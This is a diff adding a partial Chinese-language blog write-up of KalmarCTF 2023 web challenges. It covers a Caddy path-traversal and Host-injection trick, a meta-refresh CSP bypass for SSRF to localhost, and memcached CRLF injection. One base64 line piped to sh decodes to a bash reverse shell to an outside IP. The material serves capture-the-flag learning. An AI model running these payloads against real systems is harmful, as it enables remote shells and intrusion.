@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>KalmarCTF2023（部分） - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="KalmarCTF2023（部分） - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/10/KalmarCTF2023%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-10T05:07:10.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>10,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">KalmarCTF2023（部分）</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h2 id="Ez-⛳-SOLVED-Working-Boogipop、Mz1、TEL"><a href="#Ez-⛳-SOLVED-Working-Boogipop、Mz1、TEL" class="headerlink" title="Ez ⛳ | SOLVED | Working - Boogipop、Mz1、TEL"></a><strong>Ez ⛳ | SOLVED | Working - Boogipop、Mz1、TEL</strong></h2><p>U1S1没搞懂啥意思，只知道个大概，指纹是caddy 2.4.5在这个版本也没找到啥像样的洞，只找到一个<br><a target="_blank" rel="noopener" href="https://github.com/cokeBeer/go-cves/blob/main/CVE-2022-29718/CVE-2022-29718.md">https://github.com/cokeBeer/go-cves/blob/main/CVE-2022-29718/CVE-2022-29718.md</a><br>好像和版本还对不上<br>很怪<br>参照 Mz1 在数据包 Host 头进行注入，一开始发现 backups&#x2F;php.caddy.chal-kalmarc.tf 可以访问到 index.php，而访问 flag.txt 会被禁止<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269303448-f0b07fac-fa69-441d-a54a-e71e3858de8c.png#averageHue=%23313130&clientId=u1e776289-ca9d-4&from=paste&id=ue207348b&originHeight=348&originWidth=987&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u270c12df-8095-414d-b0b8-862ffbc7bae&title="><br>期间尝试了一下 &#x2F;..&#x2F;flag.txt 还真成功把 respond &#x2F;flag.txt 403 绕过了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269304586-33a0486c-1c92-4931-82b2-725954fdaf71.png#averageHue=%23af9674&clientId=u1e776289-ca9d-4&from=paste&id=uff17ada5&originHeight=308&originWidth=1034&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uc694cc85-c7dd-4fb2-9aba-a0de9f76d81&title="><br>配置文件不当造成，可直接host注入<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269303609-d0a3daa7-266d-4a7b-879f-d92f193b76ec.png#averageHue=%23f9f8f7&clientId=u1e776289-ca9d-4&from=paste&id=u214985a5&originHeight=408&originWidth=1039&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ue651e49a-f7da-491a-a830-979a8c5b4ba&title="></p>
+<h2 id="Invoiced-SOLVED-Working-Boogipop-TEL"><a href="#Invoiced-SOLVED-Working-Boogipop-TEL" class="headerlink" title="Invoiced | SOLVED | Working - Boogipop - TEL"></a>Invoiced | SOLVED | Working - Boogipop - TEL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#x27;/orders&#x27;, (req, res) =&gt; &#123;   if (req.socket.remoteAddress != &quot;::ffff:127.0.0.1&quot;) &#123;     return res.send(&quot;Nice try&quot;)   &#125;   if (req.cookies[&#x27;bot&#x27;]) &#123;     return res.send(&quot;Nice try&quot;)   &#125;   res.setHeader(&#x27;X-Frame-Options&#x27;, &#x27;none&#x27;);   res.send(process.env.FLAG || &#x27;kalmar&#123;test_flag&#125;&#x27;) &#125;) app.listen(port, () =&gt; &#123;   console.log(`Example app listening on port $&#123;port&#125;`) &#125;)</span><br></pre></td></tr></table></figure>
+<p>有牛魔的CSP限制，CSP不可控<br>可以加在指定网站的资源：<br><code>&lt;img src=&quot;https://dummyimage.com/300.png/09f/fff&quot;/&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269303528-78e7da15-363a-4419-87f4-8605809f3eaf.png#averageHue=%23edddb3&clientId=u1e776289-ca9d-4&from=paste&id=ud84b85c0&originHeight=536&originWidth=1275&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ue3635617-aefa-42c7-aa27-7ba6b7c2731&title="><br>iframe内联无果<br><code>&lt;iframe src=&quot;http://localhost:5000/orders&quot; width=&quot;800&quot; height=&quot;500&quot;&gt;&lt;/iframe&gt;</code><br>我思路是通过PDF导出进行SSRF，但这就得绕过这个CSP限制，只给了2个网站也就是题目靶场UI所需的网站<br>pdf.js里的主要逻辑：<br>之前想过Nodejs的走私攻击，但是经过测试发现好像是不可以的，Node8才可以，再看看吧，另外pdf导出用的是Skia&#x2F;PDF m111，它的CVE比较少，我也不太清楚<br>CSP的一些bypass:<br><code>https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&amp;mid=2247483786&amp;idx=1&amp;sn=da19910a9f070c996271e1004c4dd2c4&amp;chksm=e9229409de551d1f6eb39bccd9f31ef06e88cde06f59f5598caeb60d3eb8205c29acbb1245e7&amp;mpshare=1&amp;scene=23&amp;srcid=0213Rrs3rF72hAbWbaCl24bC&amp;sharer_sharetime=1676276089804&amp;sharer_shareid=096dcc929ccf5f1e5f67d3e7f4368db7#rd</code><br>还有一种思路就是<br>怎么bypassquerystring.stringify(body)<br>TEL师傅给出了一篇文章（TQL）：<br>破案了，可以直接用meta标签绕过<br><code>https://www.mi1k7ea.com/2019/02/24/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/</code><br>在这里提到了一种tips<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=target&quot; &gt;</code><br>用这种方式实现页面跳转，最后的payload也就成立<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1:5000/orders&quot; &gt;</code><br>注意用http而不是https：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269303521-7db15852-b374-48af-b58c-91efaa4760ff.png#averageHue=%23f2eccf&clientId=u1e776289-ca9d-4&from=paste&id=u12da970a&originHeight=165&originWidth=947&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u69006116-ab35-4c42-aae2-87c06068716&title="></p>
+<h2 id="Healthy-Calc-SOLVED-Working-TEL-Boogipop-M1sery-Mz1"><a href="#Healthy-Calc-SOLVED-Working-TEL-Boogipop-M1sery-Mz1" class="headerlink" title="Healthy Calc | SOLVED | Working - TEL - Boogipop - M1sery - Mz1"></a>Healthy Calc | SOLVED | Working - TEL - Boogipop - M1sery - Mz1</h2><p>PayAttention:<br>关于环境搭建</p>
+<ul>
+<li>Python!&#x3D;3.7</li>
+<li>Dependency：python-memcached、pylibmc、flask[async]（搭在windows）</li>
+<li>虚拟机起个memcached</li>
+<li>源码里的memcached地址改一下XD</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269304091-78dfe90b-a766-4162-beb6-74c58a643f1a.png#averageHue=%232d2a27&clientId=u1e776289-ca9d-4&from=paste&id=u2db11992&originHeight=108&originWidth=591&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ub89f713c-d1d1-4e7e-9803-6f62a29d8c1&title="><br>初步推断为 Python原型链<br>这题的执行点在哪里搞不清楚呜呜呜<br>调试中的fullcmd也就是最终在memcached执行的命令为b’set <strong>main</strong>.<em>add_7899_11223 2 86400 5 \r\n19122’<br>get方法对应:b’get <strong>main</strong>.<em>add_11_11’<br>需要二次注入，第一次正常赋值，第二次在后面附加恶意payload就可以绕过类型转换(maybe)<br>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3OCA8JjE&#x3D;|base64 -d|sh(shell,等下删了)<br>如下方式可以进行命令注入和篡改值：<br>GET &#x2F;calc&#x2F;add&#x2F;1&#x2F;1%0d%0aset%20__main</em></em>._add_1_1%200%203600%202%0d%0a96 HTTP&#x2F;1.1<br>格式如下<br>本地是可以执行所有命令的，但是远程的时候好像只有flush_all命令可以打通</p>
+<p>对于缓存处理部分是以set和get指令来存入memcached和取出<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269304024-b37f784f-854e-4c4b-997a-7ae8c1b4b5df.png#averageHue=%23637f65&clientId=u1e776289-ca9d-4&from=paste&id=u96909811&originHeight=942&originWidth=1538&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uf53d4b4e-bf77-45a1-954c-f7886e7a393&title="><br>回到这里，看这篇文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Archive/drops2/%E8%A2%AB%E4%BA%BA%E9%81%97%E5%BF%98%E7%9A%84Memcached%E5%86%85%E5%AD%98%E6%B3%A8%E5%B0%84.html">https://paper.seebug.org/papers/Archive/drops2/%E8%A2%AB%E4%BA%BA%E9%81%97%E5%BF%98%E7%9A%84Memcached%E5%86%85%E5%AD%98%E6%B3%A8%E5%B0%84.html</a><br>以及gopherus中的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269304131-df6acb2b-ff64-4f4a-b8ab-b427bf2c73f4.png#averageHue=%23170302&clientId=u1e776289-ca9d-4&from=paste&id=u0b06a670&originHeight=509&originWidth=1362&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ufa444868-31cb-44d2-9f9c-75160d0649b&title="></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269304167-5ac9ed78-b998-481e-b301-d2f31f3b0159.png#averageHue=%23433d3d&clientId=u1e776289-ca9d-4&from=paste&id=u23e4e472&originHeight=828&originWidth=1920&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u6838c820-bcc3-4b10-b2f7-88e685b8d48&title="><br>思路转变为对memcached进行CRLF注入，从而触发pickle反序列化<br>请问你们看到了我的shell吗？？？？</p>
+<h6 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h6><p>操作半天，shell 呢</p>
+<p>需要特别注意 set 插入的数据需要完全符合<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678269304600-6e7dc7b0-6823-46f8-92c5-de4eb802d952.png#averageHue=%23101010&clientId=u1e776289-ca9d-4&from=paste&id=ue1ba26c1&originHeight=731&originWidth=787&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ue315eba2-28b0-40b1-a365-0e1bccfd47f&title="></p>
+<h2 id="2Cool4School-OPEN-Working-Boogipop-Giveup-TEL"><a href="#2Cool4School-OPEN-Working-Boogipop-Giveup-TEL" class="headerlink" title="2Cool4School | OPEN | Working - Boogipop(Giveup) TEL"></a>2Cool4School | OPEN | Working - Boogipop(Giveup) TEL</h2><p>开了这么多题一题没解人都自闭了</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/KalmarCTF/" class="tag">#KalmarCTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/10/IdekCTF2023%20_%20Web(%E9%83%A8%E5%88%86)/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">IdekCTF2023 | Web(部分)</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/07/%E4%BB%8EPymemcached%E7%9A%84CRLF%E5%88%B0RCE/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">从Pymemcached的CRLF到RCE</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
